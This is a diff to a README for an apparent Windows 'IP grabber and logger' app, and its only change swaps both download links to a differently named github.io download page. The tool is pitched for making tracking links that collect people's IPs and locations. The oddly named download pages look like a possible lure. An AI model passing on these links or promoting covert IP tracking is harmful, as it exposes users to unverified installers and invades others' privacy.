@@ -2,7 +2,7 @@
 
 Nexus Track Pro Logger 2026 is a comprehensive Windows desktop application designed for network analysis and IP information gathering. This IP grabber and logger suite combines multiple tools into a single, intuitive interface for creating tracking links, monitoring connections, and analyzing geolocation data. Whether you're a network administrator, security researcher, or privacy enthusiast, this tool provides the functionality you need in a clean, professional package.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-v15.07-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-v15.07-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -69,7 +69,7 @@ No, Nexus Track Pro Logger 2026 requires Windows 10 (version 1903 or later) or W
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Legal Notice
 
